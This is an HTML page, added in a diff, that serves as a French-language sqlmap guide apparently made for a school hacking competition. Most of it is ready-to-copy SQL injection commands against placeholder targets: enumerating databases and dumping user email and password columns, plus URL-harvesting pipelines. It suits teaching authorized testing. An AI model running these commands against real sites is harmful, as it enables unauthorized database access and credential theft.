@@ -1,0 +1,711 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>sqlmap Advanced Guide | Cyber Arsenal</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@500;700&display=swap');
+
+    :root {
+      --bg: #0a0e17;
+      --panel: #111827;
+      --card: #0f172a;
+      --blue: #38bdf8;
+      --gold: #fbbf24;
+      --text: #e2e8f0;
+      --muted: #94a3b8;
+      --success: #34d399;
+      --danger: #f87171;
+      --border: #1e293b;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: 'JetBrains Mono', monospace;
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.65;
+      min-height: 100vh;
+      background-image:
+        radial-gradient(circle at 12% 18%, rgba(56, 189, 248, 0.06) 0%, transparent 45%),
+        radial-gradient(circle at 88% 78%, rgba(251, 191, 36, 0.05) 0%, transparent 45%);
+    }
+
+    header {
+      background: linear-gradient(135deg, #0b1228, #1e1b4b);
+      border-bottom: 1px solid var(--border);
+      padding: 34px 20px;
+      text-align: center;
+      position: relative;
+    }
+
+    header::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0;
+      height: 2px;
+      background: linear-gradient(90deg, transparent, var(--blue), var(--gold), transparent);
+    }
+
+    .logo {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 2.7rem;
+      font-weight: 700;
+      background: linear-gradient(90deg, var(--blue), var(--gold));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      letter-spacing: 2px;
+    }
+
+    .tagline {
+      color: var(--muted);
+      font-size: 0.95rem;
+      margin-top: 8px;
+      letter-spacing: 1px;
+    }
+
+    .nav {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      justify-content: center;
+      padding: 16px;
+      background: rgba(15, 23, 42, 0.92);
+      border-bottom: 1px solid var(--border);
+      position: sticky;
+      top: 0;
+      z-index: 50;
+      backdrop-filter: blur(12px);
+    }
+
+    .nav-btn {
+      padding: 9px 14px;
+      background: var(--card);
+      border: 1px solid var(--border);
+      color: var(--text);
+      border-radius: 8px;
+      cursor: pointer;
+      font-family: inherit;
+      font-size: 0.84rem;
+      transition: all 0.25s;
+    }
+
+    .nav-btn:hover, .nav-btn.active {
+      border-color: var(--blue);
+      color: var(--blue);
+      box-shadow: 0 0 15px rgba(56, 189, 248, 0.2);
+    }
+
+    main {
+      max-width: 1100px;
+      margin: 0 auto;
+      padding: 30px 20px 80px;
+    }
+
+    .section { display: none; animation: fadeIn 0.35s ease; }
+    .section.active { display: block; }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(12px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    h2 {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 1.65rem;
+      color: var(--gold);
+      margin-bottom: 18px;
+      padding-bottom: 10px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    h2::before { content: '> '; color: var(--blue); }
+    h3 { color: var(--blue); margin: 24px 0 12px; font-size: 1.12rem; }
+    p { color: var(--muted); margin-bottom: 14px; }
+
+    .card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 20px;
+      margin-bottom: 18px;
+      transition: all 0.25s;
+    }
+
+    .card:hover {
+      border-color: rgba(56, 189, 248, 0.35);
+      box-shadow: 0 0 18px rgba(56, 189, 248, 0.08);
+    }
+
+    .card-title {
+      color: var(--gold);
+      font-weight: 600;
+      margin-bottom: 10px;
+      font-size: 1.05rem;
+    }
+
+    .code-block {
+      background: #020617;
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 16px;
+      margin: 14px 0;
+      position: relative;
+      overflow-x: auto;
+      font-size: 0.9rem;
+    }
+
+    .code-block pre { margin: 0; color: #e2e8f0; white-space: pre-wrap; }
+    .cmd { color: var(--blue); }
+    .flag { color: var(--gold); }
+
+    .copy-btn {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      background: var(--panel);
+      border: 1px solid var(--border);
+      color: var(--muted);
+      padding: 4px 11px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 0.78rem;
+      font-family: inherit;
+    }
+
+    .copy-btn:hover { color: var(--gold); border-color: var(--gold); }
+    .copy-btn.copied { color: var(--success); border-color: var(--success); }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 15px 0;
+      font-size: 0.9rem;
+    }
+
+    th {
+      background: #1e293b;
+      color: var(--gold);
+      text-align: left;
+      padding: 11px 14px;
+      border-bottom: 2px solid var(--blue);
+    }
+
+    td {
+      padding: 10px 14px;
+      border-bottom: 1px solid var(--border);
+      vertical-align: top;
+    }
+
+    tr:hover td { background: rgba(56, 189, 248, 0.04); }
+    .flag-name { color: var(--blue); font-weight: 600; }
+
+    .tip {
+      background: rgba(56, 189, 248, 0.07);
+      border-left: 4px solid var(--blue);
+      padding: 13px 16px;
+      margin: 16px 0;
+      border-radius: 0 8px 8px 0;
+    }
+
+    .warning {
+      background: rgba(251, 191, 36, 0.07);
+      border-left: 4px solid var(--gold);
+      padding: 13px 16px;
+      margin: 16px 0;
+      border-radius: 0 8px 8px 0;
+    }
+
+    .danger-box {
+      background: rgba(248, 113, 113, 0.08);
+      border-left: 4px solid var(--danger);
+      padding: 13px 16px;
+      margin: 16px 0;
+      border-radius: 0 8px 8px 0;
+    }
+
+    ul, ol { color: var(--muted); margin: 10px 0 10px 22px; }
+    li { margin-bottom: 7px; }
+
+    footer {
+      text-align: center;
+      padding: 25px;
+      color: var(--muted);
+      font-size: 0.84rem;
+      border-top: 1px solid var(--border);
+    }
+
+    footer span { color: var(--gold); }
+
+    @media (max-width: 700px) {
+      .logo { font-size: 2rem; }
+      h2 { font-size: 1.3rem; }
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="logo">SQLMAP</div>
+  <div class="tagline">AUTOMATED SQL INJECTION • DETECTION • ENUMERATION • DUMP • JOUR J READY</div>
+</header>
+
+<nav class="nav">
+  <button class="nav-btn active" onclick="showSection('intro')">Introduction</button>
+  <button class="nav-btn" onclick="showSection('install')">Installation</button>
+  <button class="nav-btn" onclick="showSection('concepts')">Concepts SQLi</button>
+  <button class="nav-btn" onclick="showSection('basic')">Usage</button>
+  <button class="nav-btn" onclick="showSection('flags')">Flags</button>
+  <button class="nav-btn" onclick="showSection('examples')">Exemples</button>
+  <button class="nav-btn" onclick="showSection('workflow')">Jour J</button>
+  <button class="nav-btn" onclick="showSection('pipelines')">Pipelines</button>
+  <button class="nav-btn" onclick="showSection('tips')">Tips Pro</button>
+</nav>
+
+<main>
+
+  <!-- INTRO -->
+  <section id="intro" class="section active">
+    <h2>Introduction</h2>
+
+    <div class="card">
+      <div class="card-title">Qu'est-ce que sqlmap ?</div>
+      <p><strong>sqlmap</strong> est l’outil le plus connu pour détecter et exploiter automatiquement les injections SQL. Tu lui donnes une URL ou une requête, et il peut :</p>
+      <ul>
+        <li>Détecter une SQLi</li>
+        <li>Identifier le type d’injection</li>
+        <li>Trouver le SGBD (MySQL, PostgreSQL, MSSQL...)</li>
+        <li>Lister les databases</li>
+        <li>Lister les tables / colonnes</li>
+        <li>Dumper les data</li>
+        <li>Parfois aller jusqu’à un shell selon le contexte</li>
+      </ul>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Quand l’utiliser le jour J ?</div>
+      <ul>
+        <li>Quand tu vois des paramètres du type <code>id=</code>, <code>page=</code>, <code>cat=</code>, <code>user=</code>, <code>product=</code></li>
+        <li>Quand une page réagit bizarrement à <code>'</code> ou <code>"</code></li>
+        <li>Quand Nuclei / tests manuels suggèrent une injection</li>
+        <li>Quand tu as une requête POST de login/search/filter</li>
+      </ul>
+    </div>
+
+    <div class="tip">
+      <strong style="color:var(--blue)">Position dans l’arsenal :</strong>
+      recon → collecte d’URLs → filtre params → <strong>sqlmap</strong> → validation
+    </div>
+  </section>
+
+  <!-- INSTALL -->
+  <section id="install" class="section">
+    <h2>Installation</h2>
+
+    <h3>Kali / Debian</h3>
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+      <pre><span class="cmd">sudo apt</span> update && <span class="cmd">sudo apt</span> install sqlmap -y</pre>
+    </div>
+
+    <h3>Depuis GitHub</h3>
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+      <pre><span class="cmd">git clone</span> https://github.com/sqlmapproject/sqlmap.git
+<span class="cmd">cd</span> sqlmap
+<span class="cmd">python3</span> sqlmap.py -h</pre>
+    </div>
+
+    <h3>Vérifier</h3>
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+      <pre><span class="cmd">sqlmap</span> --version</pre>
+    </div>
+  </section>
+
+  <!-- CONCEPTS -->
+  <section id="concepts" class="section">
+    <h2>Concepts SQLi</h2>
+
+    <div class="card">
+      <div class="card-title">Types d’injection courants</div>
+      <table>
+        <tr>
+          <th>Type</th>
+          <th>Idée simple</th>
+        </tr>
+        <tr>
+          <td>Boolean-based</td>
+          <td>La page change selon vrai/faux</td>
+        </tr>
+        <tr>
+          <td>Error-based</td>
+          <td>Le SGBD renvoie des erreurs utiles</td>
+        </tr>
+        <tr>
+          <td>Union-based</td>
+          <td>On fusionne des résultats SQL</td>
+        </tr>
+        <tr>
+          <td>Time-based</td>
+          <td>Le serveur ralentit selon la condition</td>
+        </tr>
+        <tr>
+          <td>Stacked queries</td>
+          <td>Plusieurs requêtes enchaînées</td>
+        </tr>
+      </table>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Paramètres souvent vulnérables</div>
+      <ul>
+        <li><code>id</code>, <code>user_id</code>, <code>product_id</code></li>
+        <li><code>page</code>, <code>cat</code>, <code>category</code>, <code>item</code></li>
+        <li><code>sort</code>, <code>order</code>, <code>filter</code></li>
+        <li><code>search</code>, <code>q</code>, <code>query</code></li>
+      </ul>
+    </div>
+
+    <div class="warning">
+      <strong style="color:var(--gold)">Réflexe manuel rapide :</strong> teste <code>'</code>, <code>"</code>, <code>1 AND 1=1</code>, <code>1 AND 1=2</code> avant de lancer un gros sqlmap.
+    </div>
+  </section>
+
+  <!-- BASIC -->
+  <section id="basic" class="section">
+    <h2>Usage de base</h2>
+
+    <div class="card">
+      <div class="card-title">1. Test simple d’une URL</div>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre><span class="cmd">sqlmap</span> <span class="flag">-u</span> "https://target.com/page?id=1" <span class="flag">--batch</span></pre>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">2. Lister les bases</div>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre><span class="cmd">sqlmap</span> <span class="flag">-u</span> "https://target.com/page?id=1" <span class="flag">--batch</span> <span class="flag">--dbs</span></pre>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">3. Lister les tables</div>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre><span class="cmd">sqlmap</span> <span class="flag">-u</span> "https://target.com/page?id=1" <span class="flag">--batch</span> <span class="flag">-D</span> nom_db <span class="flag">--tables</span></pre>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">4. Dumper une table</div>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre><span class="cmd">sqlmap</span> <span class="flag">-u</span> "https://target.com/page?id=1" <span class="flag">--batch</span> <span class="flag">-D</span> nom_db <span class="flag">-T</span> users <span class="flag">--dump</span></pre>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">5. Requête POST</div>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre><span class="cmd">sqlmap</span> <span class="flag">-u</span> "https://target.com/login" \
+  <span class="flag">--data</span> "username=admin&password=test" \
+  <span class="flag">--batch</span></pre>
+      </div>
+    </div>
+  </section>
+
+  <!-- FLAGS -->
+  <section id="flags" class="section">
+    <h2>Flags importants</h2>
+
+    <table>
+      <tr>
+        <th>Flag</th>
+        <th>Rôle</th>
+        <th>Quand s’en servir</th>
+      </tr>
+      <tr>
+        <td><span class="flag-name">-u</span></td>
+        <td>URL cible</td>
+        <td>Toujours</td>
+      </tr>
+      <tr>
+        <td><span class="flag-name">--data</span></td>
+        <td>Body POST</td>
+        <td>Formulaires</td>
+      </tr>
+      <tr>
+        <td><span class="flag-name">--batch</span></td>
+        <td>Répond auto aux questions</td>
+        <td>Mode rapide Jour J</td>
+      </tr>
+      <tr>
+        <td><span class="flag-name">--dbs</span></td>
+        <td>Liste les databases</td>
+        <td>Dès qu’une SQLi est confirmée</td>
+      </tr>
+      <tr>
+        <td><span class="flag-name">-D</span></td>
+        <td>Choisir une database</td>
+        <td>Enum tables</td>
+      </tr>
+      <tr>
+        <td><span class="flag-name">--tables</span></td>
+        <td>Liste les tables</td>
+        <td>Après --dbs</td>
+      </tr>
+      <tr>
+        <td><span class="flag-name">-T</span></td>
+        <td>Choisir une table</td>
+        <td>Dump ciblé</td>
+      </tr>
+      <tr>
+        <td><span class="flag-name">--dump</span></td>
+        <td>Extraire les data</td>
+        <td>Phase finale</td>
+      </tr>
+      <tr>
+        <td><span class="flag-name">--level</span></td>
+        <td>Profondeur des tests (1-5)</td>
+        <td>Si rien n’est trouvé</td>
+      </tr>
+      <tr>
+        <td><span class="flag-name">--risk</span></td>
+        <td>Niveau de risque (1-3)</td>
+        <td>Tests plus agressifs</td>
+      </tr>
+      <tr>
+        <td><span class="flag-name">-p</span></td>
+        <td>Paramètre précis à tester</td>
+        <td>Pour aller plus vite</td>
+      </tr>
+      <tr>
+        <td><span class="flag-name">--cookie</span></td>
+        <td>Cookie authentifié</td>
+        <td>Zone login / panel</td>
+      </tr>
+      <tr>
+        <td><span class="flag-name">--threads</span></td>
+        <td>Parallélisme</td>
+        <td>Accélérer</td>
+      </tr>
+      <tr>
+        <td><span class="flag-name">--technique</span></td>
+        <td>Forcer un type (BEUST...)</td>
+        <td>Cas avancés</td>
+      </tr>
+      <tr>
+        <td><span class="flag-name">-r</span></td>
+        <td>Charger une requête Burp</td>
+        <td>Requêtes complexes</td>
+      </tr>
+    </table>
+  </section>
+
+  <!-- EXAMPLES -->
+  <section id="examples" class="section">
+    <h2>Exemples détaillés</h2>
+
+    <div class="card">
+      <div class="card-title">1. Scan rapide Jour J</div>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre><span class="cmd">sqlmap</span> <span class="flag">-u</span> "https://target.com/item?id=1" <span class="flag">--batch</span> <span class="flag">--dbs</span> <span class="flag">--threads</span> 5</pre>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">2. Forcer un paramètre</div>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre><span class="cmd">sqlmap</span> <span class="flag">-u</span> "https://target.com/list?page=1&sort=asc" <span class="flag">-p</span> page <span class="flag">--batch</span></pre>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">3. Niveau plus agressif</div>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre><span class="cmd">sqlmap</span> <span class="flag">-u</span> "https://target.com/page?id=1" <span class="flag">--batch</span> <span class="flag">--level</span> 3 <span class="flag">--risk</span> 2</pre>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">4. Avec cookie de session</div>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre><span class="cmd">sqlmap</span> <span class="flag">-u</span> "https://target.com/profile?id=2" \
+  <span class="flag">--cookie</span> "PHPSESSID=abcdef123" \
+  <span class="flag">--batch</span> <span class="flag">--dbs</span></pre>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">5. Depuis une requête Burp sauvegardée</div>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre><span class="cmd">sqlmap</span> <span class="flag">-r</span> request.txt <span class="flag">--batch</span> <span class="flag">--dbs</span></pre>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">6. Dump ciblé users/emails/passwords</div>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre><span class="cmd">sqlmap</span> <span class="flag">-u</span> "https://target.com/page?id=1" \
+  <span class="flag">--batch</span> <span class="flag">-D</span> appdb <span class="flag">-T</span> users <span class="flag">-C</span> id,email,password <span class="flag">--dump</span></pre>
+      </div>
+    </div>
+  </section>
+
+  <!-- JOUR J -->
+  <section id="workflow" class="section">
+    <h2>Guide Jour J</h2>
+
+    <div class="card">
+      <div class="card-title">Plan simple et efficace</div>
+      <ol>
+        <li>Fais d’abord subfinder + httpx + nuclei</li>
+        <li>Récupère des URLs avec paramètres (`gau`, `katana`)</li>
+        <li>Cible d’abord les params `id`, `page`, `cat`, `user`</li>
+        <li>Lance sqlmap en `--batch --dbs`</li>
+        <li>Si gagné : tables → dump ciblé</li>
+        <li>Ne dump pas tout bêtement si tu n’as pas le temps</li>
+      </ol>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Commandes prêtes Jour J</div>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Test rapide
+sqlmap -u "https://CIBLE/page?id=1" --batch --dbs --threads 5
+
+# Si rien trouvé
+sqlmap -u "https://CIBLE/page?id=1" --batch --level 3 --risk 2
+
+# POST login / search
+sqlmap -u "https://CIBLE/search" --data "q=test" --batch --dbs
+
+# Requête Burp
+sqlmap -r req.txt --batch --dbs</pre>
+      </div>
+    </div>
+
+    <div class="warning">
+      <strong style="color:var(--gold)">Priorisation Jour J :</strong> une SQLi confirmée avec accès DB vaut souvent plus qu’une XSS douteuse. Mais commence quand même par Nuclei pour les gains rapides.
+    </div>
+  </section>
+
+  <!-- PIPELINES -->
+  <section id="pipelines" class="section">
+    <h2>Pipelines utiles</h2>
+
+    <div class="card">
+      <div class="card-title">1. Collecte de candidats SQLi</div>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre><span class="cmd">gau</span> target.com | <span class="cmd">grep</span> "=" | <span class="cmd">grep</span> -E "id=|page=|cat=|user=|product=" > sqli-candidates.txt</pre>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">2. Avec gf sqli</div>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre><span class="cmd">cat</span> all-urls.txt | <span class="cmd">gf</span> sqli > sqli-candidates.txt</pre>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">3. Tester une liste d’URLs</div>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre><span class="cmd">sqlmap</span> <span class="flag">-m</span> sqli-candidates.txt <span class="flag">--batch</span> <span class="flag">--dbs</span></pre>
+      </div>
+    </div>
+
+    <div class="tip">
+      <strong style="color:var(--blue)">Astuce :</strong> ne lance pas sqlmap sur 5000 URLs random. Filtre d’abord. La qualité des cibles > la quantité.
+    </div>
+  </section>
+
+  <!-- TIPS -->
+  <section id="tips" class="section">
+    <h2>Tips Pro</h2>
+
+    <div class="card">
+      <div class="card-title">1. Utilise toujours --batch en concours</div>
+      <p>Sinon sqlmap pose trop de questions et te fait perdre du temps.</p>
+    </div>
+
+    <div class="card">
+      <div class="card-title">2. Monte level/risk seulement si nécessaire</div>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre><span class="cmd">sqlmap</span> -u "URL" --batch --level 3 --risk 2</pre>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">3. Spécifie le paramètre avec -p</div>
+      <p>Plus rapide, moins de bruit, plus propre.</p>
+    </div>
+
+    <div class="card">
+      <div class="card-title">4. Sauvegarde les requêtes intéressantes depuis Burp</div>
+      <p>Les vraies cibles SQLi sont souvent dans des POST, cookies ou headers, pas seulement dans l’URL.</p>
+    </div>
+
+    <div class="card">
+      <div class="card-title">5. Ne dump pas tout immédiatement</div>
+      <ul>
+        <li>Confirme la SQLi</li>
+        <li>Liste les DBs</li>
+        <li>Cherche les tables intéressantes (`users`, `accounts`, `admin`)</li>
+        <li>Dump ciblé</li>
+      </ul>
+    </div>
+
+    <div class="danger-box">
+      <strong style="color:var(--danger)">Rappel :</strong> sqlmap uniquement sur les cibles autorisées du concours / de ton scope.
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <p>sqlmap Advanced Guide • Made for <span>NCRC</span> Cyber Arsenal</div>
+  <p style="margin-top:6px; font-size:0.8rem;">SQLi • Bug Bounty • Hack ton lycée</p>
+</footer>
+
+<script>
+  function showSection(id) {
+    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+    document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+    event.target.classList.add('active');
+  }
+
+  function copyCode(btn) {
+    const code = btn.nextElementSibling.innerText;
+    navigator.clipboard.writeText(code).then(() => {
+      btn.textContent = 'Copied!';
+      btn.classList.add('copied');
+      setTimeout(() => {
+        btn.textContent = 'Copy';
+        btn.classList.remove('copied');
+      }, 1500);
+    });
+  }
+</script>
+
+</body>
+</html>
